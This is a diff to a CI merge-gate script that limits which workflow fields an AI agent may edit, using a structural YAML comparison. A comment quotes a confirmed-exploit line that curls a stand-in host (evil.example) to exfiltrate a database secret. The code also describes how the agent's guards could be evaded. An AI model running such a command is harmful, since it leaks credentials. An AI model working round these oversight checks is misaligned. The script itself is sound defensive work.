@@ -78,58 +78,157 @@ if git diff "$RANGE" -- .github/workflows/ | grep -E '^[+-][[:space:]]*(name:|on
   echo "ERREUR : nom ou déclencheur de workflow touché — merge interdit."; exit 1
 fi
 
-# 4bis. Rules 3-6 gate WHICH files/lines are frozen, but nothing so far stops
-# arbitrary edits INSIDE the two whitelisted workflows: a `run:` step body can
-# be replaced (e.g. exfiltrate an env secret via curl), a bare trigger child
-# can be added under `on:` (`push:`, `issue_comment:`, ...) without touching
-# the `on:` line rule 4 watches, or a brand-new step (`uses:`/`run:`) can be
-# appended — all invisible to rules 4-6. Close this with an explicit allowlist
-# of the ONLY line shapes the Superviseur may add/remove in these two files:
-# claude_args (model/turn edits), cron values, timeout-minutes, agent prompt
-# text, a step's own display label, and blank lines. Anything else — run:,
-# uses:, permissions/env/comments, new steps, on:'s children — is rejected.
-# A `secrets.` reference is rejected unconditionally on ANY modified line in
-# these two files, checked before the shape allowlist below — most notably on
-# an otherwise-legal claude_args line, since rule 5 explicitly exempts any
-# line containing `claude_args:` from its permissions/secrets check, which
-# would otherwise let a secret be smuggled into claude_args undetected. (For
-# this specific mutation rule 6's occurrence-count check independently catches
-# it too — verified empirically, count changes — but 4bis is what actually
-# fires first and is the only rule that would also catch a subtler variant
-# where an attacker nets the count back to zero by pairing the addition with a
-# removal on another claude_args line elsewhere — the only other line shape
-# rule 5 doesn't itself watch for secrets.)
-# CONSTRAINT: this also means a `secrets.` ref on an otherwise-allowed
-# cron/timeout-minutes/prompt line would be rejected too. Verified today: none
-# of the allowed-shape lines in either whitelisted workflow carry one (checked
-# via `grep -n 'secrets\.' .github/workflows/{veille-quotidienne,fossoyeur-hebdo}.yml`
-# — all hits are on env:/claude_code_oauth_token:/username:/password:/to:
-# lines, none on prompt:/timeout-minutes:/cron:). If a future prompt ever
-# needs to legitimately interpolate a secret, this rule would have to gain an
-# explicit exception for that case.
-WHITELISTED_WORKFLOWS=(.github/workflows/veille-quotidienne.yml .github/workflows/fossoyeur-hebdo.yml)
-BAD_LINES=""
-while IFS= read -r dline; do
-  [ -z "$dline" ] && continue
-  case "$dline" in
-    '+++'*|'---'*) continue ;;
-  esac
-  body="${dline#[+-]}"
-  if [[ "$body" == *'secrets.'* ]]; then
-    BAD_LINES+="$dline"$'\n'; continue
-  fi
-  stripped="${body#"${body%%[![:space:]]*}"}"
-  if [ -z "$stripped" ]; then continue; fi
-  if [[ "$stripped" =~ ^claude_args: ]]; then continue; fi
-  if [[ "$stripped" =~ ^-[[:space:]]*cron: ]] || [[ "$stripped" =~ ^cron: ]]; then continue; fi
-  if [[ "$stripped" =~ ^-[[:space:]]*name: ]]; then continue; fi
-  if [[ "$stripped" =~ ^timeout-minutes: ]]; then continue; fi
-  if [[ "$stripped" =~ ^prompt: ]]; then continue; fi
-  BAD_LINES+="$dline"$'\n'
-done < <(git diff "$RANGE" -- "${WHITELISTED_WORKFLOWS[@]}" | grep -E '^[+-]' || true)
-if [ -n "$BAD_LINES" ]; then
-  echo "ERREUR : ligne non éditable dans un workflow (seuls cron/timeout/model/max-turns/prompt le sont)"
-  echo "$BAD_LINES"; exit 1
+# 4bis. Line-based shape matching (this rule's previous incarnation) cannot
+# distinguish a YAML mapping key from an unrelated line INSIDE a multi-line
+# block scalar (`run: |`) that merely happens to start with the same token.
+# CONFIRMED EXPLOIT: injecting the line
+#   prompt: $(curl -s "https://evil.example/x?d=$SUPABASE_DB_URL") || true
+# inside the atelier job's existing `run: |` block (the "Préparer le mémo"
+# step) produced a diff line that, after stripping the marker and leading
+# whitespace, starts with "prompt:" — indistinguishable BY REGEX from an
+# actual `with.prompt:` key edit, so the old line-shape allowlist passed it
+# while it was really arbitrary shell code appended to `run:`'s scalar value.
+# The old rule's `- name:` shape allowance had the same class of bug: a
+# BRAND NEW single-line step "- name: x" (no run:/uses: alongside it) matched
+# that shape with nothing else in the diff to catch, silently permitting an
+# empty new step. Both are structural, not textual, problems — a line-shape
+# allowlist can never fix them because the exploit is about WHERE a line
+# sits in the tree, not what it looks like.
+#
+# Replaced entirely with a STRUCTURAL YAML diff: parse each whitelisted
+# workflow at BOTH ends of the range from git's object store (`git show
+# REF:path` — never the working tree; only the committed content on each
+# side of the range is meaningful here), walk the two parsed trees in
+# lockstep, and reject any divergence whose key-path isn't one of the 5
+# explicitly editable paths below. A `run:` value change is a leaf diff at
+# jobs.<job>.steps[<i>].run, which isn't in that list — rejected regardless
+# of what text the new value contains, closing the block-scalar exploit
+# completely. A brand-new step is a LENGTH change on the steps list, not a
+# path match on any single element — rejected regardless of that new
+# element's keys, closing the empty-step exploit. Two content constraints
+# apply on top of the 5 allowed paths themselves: a modified `prompt:` value
+# must still reference `_constitution.md` (else an agent could detach itself
+# from the constitution while looking like an ordinary prompt tweak), and a
+# modified `claude_args:` value may only contain --model/--max-turns/
+# --dangerously-skip-permissions tokens (no --mcp-config, --allowedTools,
+# --append-system-prompt, or anything else).
+WORKFLOWS_IN_DIFF=$(echo "$FILES" | grep -E '^\.github/workflows/(veille-quotidienne|fossoyeur-hebdo)\.yml$' || true)
+if [ -n "$WORKFLOWS_IN_DIFF" ]; then
+  python3 - "$BASE" "$HEADREF" $WORKFLOWS_IN_DIFF <<'PY'
+import sys, subprocess, shlex, yaml
+
+base, head = sys.argv[1], sys.argv[2]
+files = sys.argv[3:]
+
+# The ONLY key-paths the Superviseur may add/change/remove in a whitelisted
+# workflow. '*' matches any dict key or list index at that position.
+# NOTE: PyYAML's safe_load follows YAML 1.1's "Norway problem" — a bare `on:`
+# key parses as the Python bool True, not the string 'on' (verified: the
+# workflow's own top-level keys come back as
+# ['name', True, 'permissions', 'concurrency', 'env', 'jobs']). Using only the
+# string 'on' would silently never match, rejecting every legitimate cron
+# edit. List both forms: True for today's bare `on:`, the string for the day
+# someone/something (a linter autofix, a future rewrite) quotes it as `"on":`
+# — that parses as the literal string and would otherwise silently break this
+# same way in the other direction.
+ALLOWED = [
+    (True, 'schedule', '*', 'cron'),
+    ('on', 'schedule', '*', 'cron'),
+    ('jobs', '*', 'timeout-minutes'),
+    ('jobs', '*', 'steps', '*', 'name'),
+    ('jobs', '*', 'steps', '*', 'with', 'claude_args'),
+    ('jobs', '*', 'steps', '*', 'with', 'prompt'),
+]
+
+def path_matches(path, pattern):
+    return len(path) == len(pattern) and all(
+        pat == '*' or pat == p for p, pat in zip(path, pattern)
+    )
+
+def which_allowed(path):
+    for pat in ALLOWED:
+        if path_matches(path, pat):
+            return pat
+    return None
+
+def load(ref, path):
+    r = subprocess.run(['git', 'show', f'{ref}:{path}'], capture_output=True, text=True)
+    if r.returncode != 0:
+        return None
+    return yaml.safe_load(r.stdout)
+
+def fmt(path):
+    # Cosmetic only: render the YAML-1.1 bool-key back as 'on' for readable
+    # error messages (the matching logic above still uses the real bool).
+    return '.'.join('on' if p is True and i == 0 else str(p) for i, p in enumerate(path))
+
+def validate_claude_args(value):
+    try:
+        tokens = shlex.split(str(value))
+    except ValueError:
+        return False
+    with_value = {'--model', '--max-turns'}
+    bare = {'--dangerously-skip-permissions'}
+    i, n = 0, len(tokens)
+    while i < n:
+        tok = tokens[i]
+        if tok in with_value:
+            if i + 1 >= n:
+                return False
+            i += 2
+        elif tok in bare:
+            i += 1
+        else:
+            return False
+    return True
+
+violations = []    # (file, path) structural divergences outside the allowlist
+value_issues = []  # (file, path, message) content-constraint failures on allowed paths
+
+def walk(a, b, path, filename):
+    if isinstance(a, dict) and isinstance(b, dict):
+        for k in sorted(set(a) | set(b), key=str):
+            if k not in a or k not in b:
+                violations.append((filename, path + (k,)))
+            else:
+                walk(a[k], b[k], path + (k,), filename)
+    elif isinstance(a, list) and isinstance(b, list):
+        if len(a) != len(b):
+            violations.append((filename, path))
+        else:
+            for i, (x, y) in enumerate(zip(a, b)):
+                walk(x, y, path + (i,), filename)
+    else:
+        if a != b:
+            pat = which_allowed(path)
+            if pat is None:
+                violations.append((filename, path))
+            elif pat[-1] == 'prompt':
+                if '_constitution.md' not in str(b):
+                    value_issues.append((filename, path, 'le prompt modifié ne référence plus _constitution.md'))
+            elif pat[-1] == 'claude_args':
+                if not validate_claude_args(b):
+                    value_issues.append((filename, path, f'flag non autorisé dans claude_args : {b!r}'))
+
+exit_code = 0
+for f in files:
+    base_doc = load(base, f)
+    head_doc = load(head, f)
+    if base_doc is None or head_doc is None:
+        print(f"ERREUR : impossible de charger {f} depuis {base if base_doc is None else head}")
+        exit_code = 1
+        continue
+    walk(base_doc, head_doc, (), f)
+
+for filename, path in violations:
+    print(f"ERREUR : modification structurelle interdite dans {filename} : {fmt(path)}")
+    exit_code = 1
+for filename, path, msg in value_issues:
+    print(f"ERREUR : {msg} ({filename} : {fmt(path)})")
+    exit_code = 1
+
+sys.exit(exit_code)
+PY
 fi
 
 # 5. Permissions & secrets frozen — but claude_args lines (model/turns) are allowed.
